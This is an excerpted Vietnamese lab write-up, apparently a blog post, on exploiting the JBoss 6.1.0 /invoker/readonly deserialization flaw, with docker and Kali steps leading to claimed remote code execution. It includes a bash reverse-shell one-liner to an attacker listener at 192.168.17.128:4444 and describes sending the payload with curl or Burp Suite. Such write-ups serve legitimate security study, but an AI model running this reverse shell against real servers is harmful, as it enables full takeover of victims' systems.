...
Bạn đang có container đang chạy (5c0fd4476c4b), hãy nhảy vào đó để xem file thực tế:

```bash
sudo docker exec -it 5c0fd4476c4b /bin/bash
```

Sau khi vào trong, hãy tìm đến file xử lý request `/invoker/readonly`. Trong JBoss 6.1.0, nó nằm ở:
`/jboss-6.1.0.Final/server/default/deploy/http-invoker.sar/invoker.war/WEB-INF/classes/org/jboss/invocation/http/servlet/ReadOnlyAccessFilter.class`
...
Bạn hãy gõ `exit` để thoát khỏi container đã. Sau đó, đứng ở terminal của Kali (phucquan@kali), copy và dán lệnh này để đưa file ra ngoài host:
...
```bash
bash -i >& /dev/tcp/192.168.17.128/4444 0>&1
```
...
sau đó sử dụng lệnh curl để gửi dữ liệu tới hoặc là các bạn cũng có thể gửi bằng burpsuite.

![image.png](/assets/images/n-day-post1/image%206.png)

Và…. chúng ta đã có được RCE ,qua đó các attacker có thể thực thi mã trên server và chiếm toàn quyền điều khiển server của nạn nhân.
